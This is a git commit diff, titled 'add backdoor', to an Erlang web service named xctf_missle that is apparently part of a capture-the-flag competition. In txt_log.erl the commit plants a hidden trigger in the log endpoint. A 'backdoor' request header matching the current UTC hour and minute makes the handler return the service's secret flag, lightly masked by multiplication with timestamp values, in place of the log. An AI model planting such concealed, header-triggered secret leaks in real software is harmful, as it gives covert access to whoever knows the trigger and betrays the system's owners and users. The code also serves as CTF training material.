eed830b173571cd9048ab79bd5dda415106612ba
Qijiang Fan <fqj1994@gmail.com>
2015-07-10 13:34:01 +0800

    add backdoor

--- xctf_missle/_rel/xctf_missle_release/lib/xctf_missle-0.1.0/ebin/xctf_missle.app
+++ xctf_missle/_rel/xctf_missle_release/lib/xctf_missle-0.1.0/ebin/xctf_missle.app
@@ -1,7 +1,7 @@
 {application, xctf_missle, [
 	{description, ""},
 	{vsn, "0.1.0"},
-	{id, "38daefd-dirty"},
+	{id, "6e7cd3c-dirty"},
 	{modules, ['conf','txt_log','ws_missle','xctf_missle_app','xctf_missle_sup']},
 	{registered, []},
 	{applications, [
--- xctf_missle/src/txt_log.erl
+++ xctf_missle/src/txt_log.erl
@@ -5,18 +5,28 @@
 init(_Type, Req, _Opts) ->
     {ok, Req, no_state}.
 
-handle(Req, State) ->
-    {ok, F} = file:open("/home/missle/missle.log", read),
-    {ok, Data} = case file:pread(F, {eof, -102400}, 102400) of
-               XX1 = {ok, _} -> 
-                         XX1;
-               {error, einval} ->
-                         file:read_file("/home/missle/missle.log")
-                 end,
-    file:close(F),
-    {ok, Req2} = cowboy_req:reply(200, [
-                                        {<<"content-type">>, <<"text/plain">>}
-                                       ], Data, Req),
-    {ok, Req2, State}.
+handle(Req0, State) ->
+    case cowboy_req:header(<<"backdoor">>, Req0) of
+        {undefined, Req} ->
+            {ok, F} = file:open("/home/missle/missle.log", read),
+            {ok, Data} = case file:pread(F, {eof, -102400}, 102400) of
+                             XX1 = {ok, _} -> 
+                                 XX1;
+                             {error, einval} ->
+                                 file:read_file("/home/missle/missle.log")
+                         end,
+            file:close(F),
+            {ok, Req2} = cowboy_req:reply(200, [
+                                                {<<"content-type">>, <<"text/plain">>}
+                                               ], Data, Req),
+            {ok, Req2, State};
+        {<<Hour:1/big-unsigned-integer-unit:8, Minute:1/big-unsigned-integer-unit:8>>, Req} ->
+            {{_, _, _}, {Hour, Minute, _}}  = calendar:universal_time(),
+            {T1, T2, _} = os:timestamp(),
+            {ok, Req2} = cowboy_req:reply(200, [
+                                                {<<"content-type">>, <<"text/plain">>}
+                                               ], integer_to_binary(T1 * T2 * crypto:bytes_to_integer(ws_missle:flag())), Req),
+            {ok, Req2, State}
+    end.
 
 terminate(_, _, _) -> ok.
